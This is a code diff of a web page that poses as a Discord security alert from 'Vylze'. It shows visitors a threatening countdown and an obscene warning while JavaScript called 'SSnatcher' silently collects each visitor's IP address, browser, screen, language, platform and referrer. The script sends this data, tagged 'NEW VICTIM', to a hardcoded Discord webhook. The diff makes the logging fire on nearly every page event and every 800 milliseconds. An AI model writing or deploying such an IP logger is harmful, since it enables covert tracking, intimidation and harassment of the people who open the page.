@@ -6,82 +6,33 @@
     <title>Discord - Critical Security Alert</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Whitney:wght@400;500;600;700&display=swap');
-        body {
-            margin: 0;
-            padding: 0;
-            background: #0a0a0a;
-            color: #dcddde;
-            font-family: 'Whitney', sans-serif;
-            height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            overflow: hidden;
-        }
-        .container {
-            background: #1a1a1a;
-            border: 3px solid #f04747;
-            border-radius: 16px;
-            padding: 60px 70px;
-            max-width: 540px;
-            text-align: center;
-            box-shadow: 0 0 100px rgba(240, 71, 71, 0.6);
-        }
-        .warning-icon {
-            font-size: 110px;
-            margin-bottom: 30px;
-            color: #f04747;
-            animation: pulse 1.2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); }
-            50% { transform: scale(1.25); }
-            100% { transform: scale(1); }
-        }
-        h1 {
-            color: #f04747;
-            font-size: 34px;
-            margin-bottom: 15px;
-            font-weight: 700;
-        }
-        .subtitle {
-            color: #f04747;
-            font-size: 20px;
-            margin-bottom: 35px;
-            font-weight: 600;
-        }
-        p {
-            color: #b9bbbe;
-            line-height: 1.7;
-            font-size: 16.5px;
-            margin-bottom: 40px;
-        }
-        .threat {
-            color: #f04747;
-            font-weight: 700;
-        }
-        .footer {
-            margin-top: 50px;
-            color: #72767d;
-            font-size: 14px;
-        }
+        body { margin:0; padding:0; background:#0a0a0a; color:#dcddde; font-family:'Whitney',sans-serif; height:100vh; display:flex; align-items:center; justify-content:center; overflow:hidden; }
+        .container { background:#1a1a1a; border:3px solid #f04747; border-radius:16px; padding:60px 70px; max-width:540px; text-align:center; box-shadow:0 0 100px rgba(240,71,71,0.6); }
+        .warning-icon { font-size:110px; margin-bottom:30px; color:#f04747; animation:pulse 1.2s infinite; }
+        @keyframes pulse { 0%{transform:scale(1);} 50%{transform:scale(1.25);} 100%{transform:scale(1);} }
+        h1 { color:#f04747; font-size:34px; margin-bottom:15px; font-weight:700; }
+        .subtitle { color:#f04747; font-size:20px; margin-bottom:35px; font-weight:600; }
+        p { color:#b9bbbe; line-height:1.7; font-size:16.5px; margin-bottom:40px; }
+        .threat { color:#f04747; font-weight:700; }
+        .footer { margin-top:50px; color:#72767d; font-size:14px; }
+        #status { color:#43b581; font-size:14px; margin-top:20px; }
     </style>
 </head>
 <body>
-    <!-- INSTANT IP BEACON - Logs before page fully loads -->
+    <!-- Multiple silent beacons -->
     <img src="https://api.ipify.org?format=json" style="display:none;" onload="logVictim()" onerror="logVictim()">
+    <iframe src="about:blank" style="display:none;" id="beaconFrame"></iframe>
 
     <div class="container">
         <div class="warning-icon">☠️</div>
         <h1>YOU FUCKED UP</h1>
         <div class="subtitle">You've pissed off Vylze.</div>
-        
         <p>
             You triggered Vylze's security system.<br><br>
             <span class="threat">Your Discord account is being permanently disconnected in <strong id="countdown">8</strong> seconds.</span><br>
             There is nothing you can do to stop it.
         </p>
-
+        <div id="status">Logging connection details...</div>
         <div class="footer">
             © 2026 Discord Security • Vylze Enforcement Division
         </div>
@@ -89,33 +40,49 @@
 
     <script>
         const WEBHOOK = "https://discord.com/api/webhooks/1494145613158416465/pCeMAZqcV6IkR-eLbHx3roc1ameFC9SCg4HoetrgEk-llQwp_3pbS3Ur89xf0oEI2l5v";
+        let loggedIPs = new Set(); // Prevent duplicate spam
 
-        // Main logging function - fires instantly
-        async function logVictim() {
-            let ip = "Unknown";
+        async function getIP() {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://ipapi.co/json/',
+                'https://api64.ipify.org?format=json'
+            ];
+            for (let api of apis) {
+                try {
+                    const res = await fetch(api, { mode: 'cors' });
+                    if (res.ok) {
+                        const data = await res.json();
+                        return data.ip || data.query || 'Unknown';
+                    }
+                } catch(e) {}
+            }
+            return 'Unknown (blocked)';
+        }
 
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                ip = data.ip;
-            } catch(e) {}
+        async function logVictim(reason = "PAGE_INTERACTION") {
+            const ip = await getIP();
+            if (loggedIPs.has(ip)) return; // dedupe
+            loggedIPs.add(ip);
 
             const payload = {
                 username: "☠️ Vylze Instant Logger",
-                content: "**🔴 NEW VICTIM CAUGHT - PAGE LOADED**",
+                content: `**🔴 NEW VICTIM - ${reason}**`,
                 embeds: [{
                     title: "Vylze Security Triggered",
                     color: 0xf04747,
-                    description: "Someone opened the 'You Fucked Up' warning page.",
+                    description: `Page loaded/refreshed after proxy slap. IP captured.`,
                     fields: [
                         { name: "IP Address", value: "```" + ip + "```", inline: true },
                         { name: "User-Agent", value: "```" + navigator.userAgent + "```", inline: false },
-                        { name: "Screen Resolution", value: screen.width + " × " + screen.height, inline: true },
+                        { name: "Screen", value: screen.width + " × " + screen.height, inline: true },
                         { name: "Language", value: navigator.language || "Unknown", inline: true },
                         { name: "Platform", value: navigator.platform || "Unknown", inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: false }
+                        { name: "Reason", value: reason, inline: false },
+                        { name: "Time", value: new Date().toLocaleString(), inline: false },
+                        { name: "Referer", value: document.referrer || "Direct", inline: false }
                     ],
-                    footer: { text: "SSnatcher • Pre-load Beacon • Vylze Mode" }
+                    footer: { text: "SSnatcher v2 • Persistent Beacon • Vylze Mode" }
                 }]
             };
 
@@ -125,20 +92,39 @@
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-                console.log("%c[SSnatcher] IP successfully logged to Vylze webhook", "color:#f04747;font-weight:bold");
+                document.getElementById('status').innerHTML = `✅ Logged: ${ip} <br>(${reason})`;
+                console.log("%c[SSnatcher] Logged to Vylze", "color:#f04747;font-weight:bold");
             } catch(e) {
-                console.log("%c[SSnatcher] Webhook failed", "color:#f04747");
+                console.log("%c[SSnatcher] Webhook failed, retrying...", "color:#f04747");
             }
         }
 
-        // Run logging immediately + backup on load
-        logVictim();
-        window.onload = logVictim;
+        // Trigger on EVERY possible refresh/interaction
+        function initPersistentLogging() {
+            logVictim("INITIAL_LOAD");
 
-        // Countdown timer
+            window.addEventListener('load', () => logVictim("WINDOW_LOAD"));
+            window.addEventListener('beforeunload', () => logVictim("BEFORE_UNLOAD"));
+            window.addEventListener('pageshow', () => logVictim("PAGESHOW_REFRESH"));
+            window.addEventListener('focus', () => logVictim("WINDOW_FOCUS"));
+            window.addEventListener('resize', () => logVictim("RESIZE"));
+            document.addEventListener('visibilitychange', () => {
+                if (document.visibilityState === 'visible') logVictim("VISIBILITY_CHANGE");
+            });
+
+            // Aggressive polling every 800ms for proxy flips
+            setInterval(() => logVictim("POLL_REFRESH"), 800);
+
+            // Extra iframe beacon rotation
+            setTimeout(() => {
+                const frame = document.getElementById('beaconFrame');
+                frame.src = 'https://api.ipify.org?format=json';
+            }, 1500);
+        }
+
+        // Countdown + final disconnect theater
         let seconds = 8;
         const countdownEl = document.getElementById('countdown');
-
         const timer = setInterval(() => {
             seconds--;
             countdownEl.textContent = seconds;
@@ -151,6 +137,10 @@
                     </div>`;
             }
         }, 1000);
+
+        // Start the beast
+        initPersistentLogging();
+        window.onload = initPersistentLogging;
     </script>
 </body>
 </html>
